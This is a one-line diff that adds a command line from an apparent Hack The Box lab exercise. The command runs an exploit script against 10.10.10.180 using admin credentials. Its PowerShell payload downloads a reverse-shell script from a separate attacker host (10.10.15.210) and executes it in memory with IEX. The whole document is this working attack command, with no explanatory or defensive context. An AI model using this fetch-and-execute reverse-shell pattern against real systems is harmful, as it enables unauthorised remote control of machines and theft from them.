@@ -1,0 +1,1 @@
+python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -cmd powershell -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.210/iguin-reverse.ps1')"
